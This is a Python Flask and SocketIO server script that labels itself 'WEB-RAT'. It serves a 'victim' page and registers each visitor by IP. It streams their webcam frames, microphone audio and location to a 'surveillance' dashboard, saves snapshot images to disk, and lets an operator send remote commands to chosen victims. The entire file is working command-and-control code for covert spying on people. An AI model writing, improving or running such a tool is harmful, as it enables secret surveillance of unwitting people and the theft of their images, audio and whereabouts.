import os
import subprocess
import time
import sys
import base64
import json
import shutil
import random
from datetime import datetime
from flask import Flask, render_template_string, request, send_from_directory, abort
from flask_socketio import SocketIO, emit, join_room

# ========== CONFIGURATION ==========
PORT = 5000
CAPTURES_DIR = os.path.join(os.getcwd(), "captures")
os.makedirs(CAPTURES_DIR, exist_ok=True)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
# Increase buffer size to 10MB to handle image frames
socketio = SocketIO(app, 
    cors_allowed_origins="*", 
    max_http_buffer_size=10 * 1024 * 1024, 
    ping_timeout=60,
    async_mode='threading',
    allow_upgrades=True
)

# Template Cache
_template_cache = {}

def load_template(filename):
    if filename not in _template_cache:
        try:
            with open(filename, "r", encoding="utf-8") as f:
                _template_cache[filename] = f.read()
        except Exception:
            return "<h1>File Not Found: {}</h1>".format(filename)
    return _template_cache[filename]

@app.route("/")
def index():
    return render_template_string(load_template("victim.html"))

@app.route("/surveillance")
@app.route("/dashboard")
def surveillance():
    return render_template_string(load_template("surveillance.html"), socket_url="/")

# Track connected victims: sid -> data
connected_victims = {}

@socketio.on('connect')
def handle_connect():
    client_type = request.args.get('type')
    if client_type in ['surveillance', 'dashboard']:
        join_room('surveillance')
        print(f"[*] Surveillance joined: {request.sid}")
        victims = [{'sid': sid, 'ip': data['ip']} for sid, data in connected_victims.items()]
        emit('victim_list_sync', victims)
    else:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        connected_victims[request.sid] = {'ip': ip}
        join_room('victims')
        print(f"[*] Victim joined: {request.sid} from {ip}")
        socketio.emit('victim_connected', {'sid': request.sid, 'ip': ip}, room='surveillance')

@socketio.on('force_sync')
def handle_force_sync():
    victims = [{'sid': sid, 'ip': data['ip']} for sid, data in connected_victims.items()]
    emit('victim_list_sync', victims)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_victims:
        del connected_victims[request.sid]
        print(f"[-] Victim disconnected: {request.sid}")
        socketio.emit('victim_disconnected', {'sid': request.sid}, room='surveillance')
    else:
        print(f"[*] Control Panel disconnected: {request.sid}")

@socketio.on('video_frame')
def handle_video_frame(data):
    socketio.emit('video_frame', {'sid': request.sid, 'data': data}, room='surveillance')
    return "ACK"

@socketio.on('audio_chunk')
def handle_audio_chunk(data):
    socketio.emit('audio_chunk', {'sid': request.sid, 'data': data}, room='surveillance')

@socketio.on('location_update')
def handle_location_update(data):
    print(f"[*] Location update from {request.sid[:6]}: {data.get('lat')}, {data.get('lon')}")
    socketio.emit('location_update', {'sid': request.sid, 'data': data}, room='surveillance')

@socketio.on('remote_command')
def handle_remote_command(data):
    target = data.get('target_sid')
    if target:
        socketio.emit('remote_command', data, room=target)
    else:
        socketio.emit('remote_command', data, room='victims')

@socketio.on('client_log')
def handle_client_log(msg):
    socketio.emit('log_update', {'sid': request.sid, 'msg': msg}, room='surveillance')

@socketio.on('surveillance_snapshot')
def handle_surveillance_snapshot(data):
    socketio.emit('surveillance_snapshot', {'sid': request.sid, 'data': data}, room='surveillance')
    try:
        val = data.get('image') if isinstance(data, dict) else data
        if val and "," in val:
            _, encoded = val.split(",", 1)
            img_data = base64.b64decode(encoded)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"snapshot_{request.sid[:4]}_{timestamp}_{random.randint(100, 999)}.jpg"
            filepath = os.path.join(CAPTURES_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(img_data)
            mirror_capture(filepath, filename)
    except Exception as e:
        print(f"[!] Error saving snapshot: {e}")

def mirror_capture(src_path, filename):
    try:
        dest_dir = None
        if os.name == 'nt':
            dest_dir = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'WebRat_Captures')
        elif os.path.exists("/sdcard"):
            dest_dir = "/sdcard/Download/WebRat_Captures"
        
        if dest_dir:
            os.makedirs(dest_dir, exist_ok=True)
            shutil.copy2(src_path, os.path.join(dest_dir, filename))
            return True
    except Exception:
        pass
    return False

@app.route('/captures/<path:filename>')
def download_file(filename):
    return send_from_directory(CAPTURES_DIR, filename)

@app.route('/<path:filename>')
def serve_static(filename):
    # Security: Prevent access to source files
    if filename.endswith(('.py', '.pyc', '.git', '.env')):
        abort(403)
    return send_from_directory('.', filename)

@app.route('/api/captures')
def list_captures():
    files = []
    if os.path.exists(CAPTURES_DIR):
        for f in os.listdir(CAPTURES_DIR):
            path = os.path.join(CAPTURES_DIR, f)
            if os.path.isfile(path):
                files.append({
                    "name": f,
                    "url": f"/captures/{f}",
                    "time": os.path.getmtime(path)
                })
        files.sort(key=lambda x: x['time'], reverse=True)
    return json.dumps(files)

def kill_port(port):
    try:
        if os.name == 'nt':
            cmd = f'netstat -ano | findstr :{port}'
            pids = set()
            with os.popen(cmd) as f:
                for line in f:
                    if "LISTENING" in line:
                        parts = line.split()
                        if parts: pids.add(parts[-1])
            for pid in pids:
                if pid != "0":
                    subprocess.run(['taskkill', '/F', '/T', '/PID', pid], capture_output=True)
        else:
            subprocess.run(['fuser', '-k', f'{port}/tcp'], capture_output=True)
    except Exception:
        pass

def main():
    print("[*] Initializing WEB-RAT System...")
    kill_port(PORT)
    
    print(f"\n{'='*60}")
    print(f" SYSTEM ONLINE: http://localhost:{PORT}")
    print(f" SURVEILLANCE:  http://localhost:{PORT}/surveillance")
    print(f"{'='*60}\n")
    
    try:
        socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n[!] Stopping server...")

if __name__ == "__main__":
    main()
